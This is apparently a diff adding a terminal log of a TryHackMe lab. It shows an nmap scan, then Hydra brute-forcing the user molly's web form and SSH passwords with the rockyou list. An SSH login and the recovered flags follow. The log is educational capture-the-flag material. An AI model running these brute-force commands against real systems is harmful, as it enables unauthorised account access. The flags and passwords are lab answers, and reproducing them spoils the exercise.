@@ -1,0 +1,178 @@
+┌──(anonymous㉿Unknown)-[~]
+└─$ sudo openvpn /home/anonymous/Works/TryHackMe/AbdulRahimK.ovpn
+[sudo] password for anonymous: 
+2022-04-17 09:54:06 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Sent packets are not compressed unless "allow-compression yes" is also set.
+2022-04-17 09:54:06 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
+2022-04-17 09:54:06 OpenVPN 2.5.6 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Mar 20 2022
+2022-04-17 09:54:06 library versions: OpenSSL 1.1.1n  15 Mar 2022, LZO 2.10
+2022-04-17 09:54:06 Outgoing Control Channel Authentication: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-17 09:54:06 Incoming Control Channel Authentication: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-17 09:54:06 TCP/UDP: Preserving recently used remote address: [AF_INET]18.202.129.195:1194
+2022-04-17 09:54:06 Socket Buffers: R=[212992->212992] S=[212992->212992]
+2022-04-17 09:54:06 UDP link local: (not bound)
+2022-04-17 09:54:06 UDP link remote: [AF_INET]18.202.129.195:1194
+2022-04-17 09:54:07 TLS: Initial packet from [AF_INET]18.202.129.195:1194, sid=0fa6d258 70393d59
+2022-04-17 09:54:07 VERIFY OK: depth=1, CN=ChangeMe
+2022-04-17 09:54:07 VERIFY KU OK
+2022-04-17 09:54:07 Validating certificate extended key usage
+2022-04-17 09:54:07 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
+2022-04-17 09:54:07 VERIFY EKU OK
+2022-04-17 09:54:07 VERIFY OK: depth=0, CN=server
+2022-04-17 09:54:07 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 2048 bit RSA, signature: RSA-SHA256
+2022-04-17 09:54:07 [server] Peer Connection Initiated with [AF_INET]18.202.129.195:1194
+2022-04-17 09:54:08 SENT CONTROL [server]: 'PUSH_REQUEST' (status=1)
+2022-04-17 09:54:09 PUSH: Received control message: 'PUSH_REPLY,route 10.10.0.0 255.255.0.0,route-metric 1000,comp-lzo no,route-gateway 10.8.0.1,topology subnet,ping 5,ping-restart 120,ifconfig 10.8.73.220 255.255.0.0,peer-id 44'
+2022-04-17 09:54:09 OPTIONS IMPORT: timers and/or timeouts modified
+2022-04-17 09:54:09 OPTIONS IMPORT: compression parms modified
+2022-04-17 09:54:09 OPTIONS IMPORT: --ifconfig/up options modified
+2022-04-17 09:54:09 OPTIONS IMPORT: route options modified
+2022-04-17 09:54:09 OPTIONS IMPORT: route-related options modified
+2022-04-17 09:54:09 OPTIONS IMPORT: peer-id set
+2022-04-17 09:54:09 OPTIONS IMPORT: adjusting link_mtu to 1625
+2022-04-17 09:54:09 Using peer cipher 'AES-256-CBC'
+2022-04-17 09:54:09 Outgoing Data Channel: Cipher 'AES-256-CBC' initialized with 256 bit key
+2022-04-17 09:54:09 Outgoing Data Channel: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-17 09:54:09 Incoming Data Channel: Cipher 'AES-256-CBC' initialized with 256 bit key
+2022-04-17 09:54:09 Incoming Data Channel: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-17 09:54:09 net_route_v4_best_gw query: dst 0.0.0.0
+2022-04-17 09:54:09 net_route_v4_best_gw result: via 192.168.1.1 dev eth0
+2022-04-17 09:54:09 ROUTE_GATEWAY 192.168.1.1/255.255.255.0 IFACE=eth0 HWADDR=00:50:56:21:88:bb
+2022-04-17 09:54:09 TUN/TAP device tun0 opened
+2022-04-17 09:54:09 net_iface_mtu_set: mtu 1500 for tun0
+2022-04-17 09:54:09 net_iface_up: set tun0 up
+2022-04-17 09:54:09 net_addr_v4_add: 10.8.73.220/16 dev tun0
+2022-04-17 09:54:09 net_route_v4_add: 10.10.0.0/16 via 10.8.0.1 dev [NULL] table 0 metric 1000
+2022-04-17 09:54:09 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
+2022-04-17 09:54:09 Initialization Sequence Completed
+
+====================================================================================================================
+START THE MACHINE: MACHINE IP: 10.10.97.198
+
+====================================================================================================================
+                                                                                                                                                                                             
+┌──(root㉿Unknown)-[/home/anonymous]
+└─# nmap -Pn -p- 10.10.97.198
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-17 10:07 EDT
+Stats: 0:03:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 55.04% done; ETC: 10:13 (0:02:39 remaining)
+Stats: 0:05:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 93.28% done; ETC: 10:13 (0:00:23 remaining)
+Nmap scan report for 10.10.97.198
+Host is up (0.17s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 350.39 seconds
+
+===================================================================================================================
+Use Hydra to bruteforce molly's web password. What is flag 1?
+
+┌──(root㉿Unknown)-[/home/anonymous]
+└─# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.97.198 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-17 10:27:59
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.97.198:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "654321" - 17 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "michael" - 18 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "ashley" - 19 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "qwerty" - 20 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "111111" - 21 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "iloveu" - 22 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "000000" - 23 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "michelle" - 24 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "tigger" - 25 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "sunshine" - 26 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "chocolate" - 27 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "password1" - 28 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "soccer" - 29 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "anthony" - 30 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "friends" - 31 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "butterfly" - 32 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "purple" - 33 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "angel" - 34 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "jordan" - 35 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "liverpool" - 36 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "justin" - 37 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "loveme" - 38 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "fuckyou" - 39 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "123123" - 40 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "football" - 41 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "secret" - 42 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "andrea" - 43 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "carlos" - 44 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.97.198 - login "molly" - pass "jennifer" - 45 of 14344399 [child 11] (0/0)
+[80][http-post-form] host: 10.10.97.198   login: molly   password: sunshine
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-17 10:28:05
+
+===================================================================================================================
+Login with Browser : get first flag.
+
+THM{2673a7dd116de68e85c48ec0b1f2612e}
+===================================================================================================================
+Use Hydra to bruteforce molly's SSH password. What is flag 2?
+
+┌──(root㉿Unknown)-[/home/anonymous]
+└─# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.97.198 ssh
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-17 10:17:44
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.97.198:22/
+[22][ssh] host: 10.10.97.198   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-17 10:17:55
+===================================================================================================================
+┌──(root㉿Unknown)-[/home/anonymous]
+└─# ssh molly@10.10.97.198
+The authenticity of host '10.10.97.198 (10.10.97.198)' can't be established.
+ED25519 key fingerprint is SHA256:ZzW8R+CU3If+zUctoVF8GgRD4gNbABMs8mpxkkM39oc.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
+Warning: Permanently added '10.10.97.198' (ED25519) to the list of known hosts.
+molly@10.10.97.198's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+32 updates are security updates.
+
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+molly@ip-10-10-97-198:~$ 
+
+===================================================================================================================
+molly@ip-10-10-97-198:~$ ls
+flag2.txt
+molly@ip-10-10-97-198:~$ cat flag2.txt 
+THM{c8eeb0468febbadea859baeb33b2541b}
+molly@ip-10-10-97-198:~$ 
+
+===================================================================================================================
+
+
+
